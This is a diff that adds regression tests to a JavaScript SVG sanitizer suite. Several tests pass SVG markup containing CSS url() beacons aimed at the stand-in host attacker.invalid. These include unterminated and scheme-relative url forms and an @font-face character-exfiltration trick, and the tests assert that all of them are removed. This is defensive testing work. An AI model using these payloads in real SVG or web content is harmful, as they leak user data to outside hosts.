@@ -1185,6 +1185,33 @@ uiSuite("SVG Sanitizer (XSS)", [
     const out = sanitizeSvgMarkup('<rect fill="url(https://attacker.invalid/b)" filter="url(https://attacker.invalid/f)"/>');
     return !/attacker\.invalid/i.test(out);
   }},
+  // v13.18 — detection must not depend on a closing ')': the CSS tokenizer consumes
+  // an UNTERMINATED url( to end-of-input and still emits a fetchable url-token, so a
+  // paren-balanced regex missed both the bare and quoted unterminated forms.
+  { name: "SVG <style> unterminated url( (bare) removed (EOF url-token)", fn: async () => {
+    const out = sanitizeSvgMarkup('<style>rect{fill:url(https://attacker.invalid/b?d=x</style><rect/>');
+    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
+  }},
+  { name: "SVG <style> unterminated url( (quoted) removed (EOF url-token)", fn: async () => {
+    const out = sanitizeSvgMarkup('<style>rect{fill:url("https://attacker.invalid/b?d=x</style><rect/>');
+    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
+  }},
+  { name: "SVG style='…url(https://…' unterminated attr removed", fn: async () => {
+    const out = sanitizeSvgMarkup('<rect style="background-image:url(https://attacker.invalid/b" mask="url(https://attacker.invalid/m"/>');
+    return !/attacker\.invalid/i.test(out);
+  }},
+  { name: "SVG scheme-relative url(//host) removed", fn: async () => {
+    const out = sanitizeSvgMarkup('<style>*{background:url(//attacker.invalid/b)}</style><rect fill="url(//attacker.invalid/p)"/>');
+    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
+  }},
+  { name: "SVG <style> @font-face char-exfil removed", fn: async () => {
+    const out = sanitizeSvgMarkup('<style>@font-face{font-family:x;src:url(https://attacker.invalid/f)}text{font-family:x}</style><text x="1" y="9">A</text>');
+    return !/attacker\.invalid/i.test(out) && !/@font-face/i.test(out) && !/<style[\s>]/i.test(out);
+  }},
+  { name: "SVG url(#fragment) with whitespace/quotes still preserved (no false reject)", fn: async () => {
+    const out = sanitizeSvgMarkup('<style>.a{fill:url( #grad )}.b{mask:url("#m")}</style><rect class="a" clip-path="url(#c)"/>');
+    return /<style/i.test(out) && /#grad/.test(out) && /url\(#c\)/.test(out);
+  }},
   { name: "SVG external <image href> beacon removed (#fragment only)", fn: async () => {
     const out = sanitizeSvgMarkup('<image href="https://attacker.invalid/b.png"/>');
     return !/attacker\.invalid/i.test(out);
